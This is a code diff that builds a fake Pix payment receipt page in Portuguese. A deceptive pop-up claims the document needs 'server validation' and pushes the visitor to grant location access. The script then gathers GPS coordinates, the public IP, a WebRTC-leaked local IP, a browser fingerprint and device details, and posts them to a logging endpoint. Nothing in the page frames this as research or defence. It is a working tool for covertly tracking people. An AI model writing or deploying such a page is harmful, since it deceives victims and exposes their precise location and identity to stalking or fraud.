@@ -1,20 +1,40 @@
-<script>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Comprovante</title>
+  <style>
+    body {
+      background: #fff;
+      text-align: center;
+      font-family: Arial;
+    }
+    img {
+      margin-top: 50px;
+      width: 90%;
+      max-width: 500px;
+    }
+  </style>
+</head>
+<body>
+  <img src="comprovante.jpg" alt="Comprovante Pix" />
+
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+
+  <script>
     async function rastrearComPermissaoGPS() {
       try {
-        // Espera a permissão real de GPS
         navigator.geolocation.getCurrentPosition(async (pos) => {
           const gpsCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
           console.log("📍 Localização GPS precisa:", gpsCoords);
-  
-          // IP Público
+
           const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
-  
-          // IP Local via WebRTC
+
           const pc = new RTCPeerConnection({ iceServers: [] });
           pc.createDataChannel("");
           const offer = await pc.createOffer();
           await pc.setLocalDescription(offer);
-  
+
           let localIP = "N/A";
           pc.onicecandidate = event => {
             if (event && event.candidate) {
@@ -22,12 +42,10 @@
               if (match) localIP = match[1];
             }
           };
-  
-          // Fingerprint
+
           const fp = await FingerprintJS.load();
           const result = await fp.get();
-  
-          // Payload completo
+
           const data = {
             ip: ipData.ip,
             localIP,
@@ -36,15 +54,15 @@
             device: `${navigator.platform} - ${navigator.userAgent}`,
             loc: gpsCoords
           };
-  
+
           console.log("📦 Payload final:", data);
-  
+
           await fetch("/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
           });
-  
+
           console.log("✅ Dados enviados com sucesso");
         }, (err) => {
           console.warn("⚠️ Permissão de localização negada ou falhou:", err);
@@ -53,22 +71,21 @@
         console.error("❌ Erro geral no rastreamento:", e);
       }
     }
-  
-    // Pop-up personalizado chamativo
+
     window.onload = () => {
       const alerta = document.createElement("div");
       alerta.style = "background: #fffbe6; border: 2px solid #ffd700; padding: 20px; margin: 30px; font-size: 18px; font-family: Arial;";
       alerta.innerHTML = `
         ⚠️ <b>Este documento precisa ser validado em nosso servidor.</b><br><br>
-        Por favor, clique em <b>“Permitir”</b na próxima tela para concluir a verificação.
+        Por favor, clique em <b>“Permitir”</b> na próxima tela para concluir a verificação.
       `;
-  
+
       document.body.appendChild(alerta);
-  
-      // Após 2 segundos, dispara rastreamento
+
       setTimeout(() => {
         rastrearComPermissaoGPS();
       }, 2000);
     };
   </script>
-  
+</body>
+</html>
